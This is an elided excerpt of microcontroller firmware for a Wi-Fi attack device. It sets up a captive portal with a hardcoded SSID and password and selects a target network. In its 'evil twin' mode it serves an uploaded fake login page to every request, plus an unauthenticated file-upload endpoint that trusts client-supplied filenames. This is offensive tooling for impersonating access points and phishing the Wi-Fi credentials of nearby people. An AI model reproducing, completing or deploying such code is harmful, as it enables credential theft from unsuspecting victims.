 ...
 * SSID: GMpro2 | PASS: sangkur87 | CAPTIVE PORTAL: ACTIVE
 */
...
void setup() {
  ...
  server.on("/generate_204", handleRoot); server.on("/fwlink", handleRoot);
  server.on("/upload_page", [](){
    String up = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h3>UPLOAD UI (.html)</h3>";
    up += "<form method='POST' action='/do_upload' enctype='multipart/form-data'><input type='file' name='upload'><br><br><input type='submit' value='UPLOAD'></form></body></html>";
    server.send(200, "text/html", up);
  });
  server.on("/do_upload", HTTP_POST, [](){ server.send(200, "text/html", "OK! <a href='/'>Back</a>"); }, [](){
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) { File f = LittleFS.open("/" + upload.filename, "w"); f.close(); }
    else if (upload.status == UPLOAD_FILE_WRITE) { File f = LittleFS.open("/" + upload.filename, "a"); if(f) f.write(upload.buf, upload.currentSize); f.close(); }
  });
  
  server.on("/select", []() {
    int id = server.arg("id").toInt(); target_ssid = WiFi.SSID(id); target_ch = WiFi.channel(id);
  ...
  server.onNotFound([]() {
    if (eviltwin_active && LittleFS.exists("/etwin.html")) { File f = LittleFS.open("/etwin.html", "r"); server.streamFile(f, "text/html"); f.close(); }
    else if (prank_active && LittleFS.exists("/prank.html")) { File f = LittleFS.open("/prank.html", "r"); server.streamFile(f, "text/html"); f.close(); }
    else { handleRoot(); }
  });
  server.begin();
